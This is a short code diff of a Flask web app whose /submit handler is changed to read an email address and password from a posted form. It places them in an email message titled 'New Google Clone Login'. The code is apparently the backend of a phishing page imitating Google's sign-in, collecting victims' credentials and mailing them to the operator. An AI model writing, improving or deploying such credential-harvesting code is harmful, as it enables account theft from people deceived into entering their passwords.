@@ -20,9 +20,8 @@ def password():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    data = request.get_json()
-    email = data.get("email")
-    password = data.get("password")
+    email = request.form.get("email")
+    password = request.form.get("password")
 
     msg = MIMEText(f"Email: {email}\nPassword: {password}")
     msg["Subject"] = "New Google Clone Login"
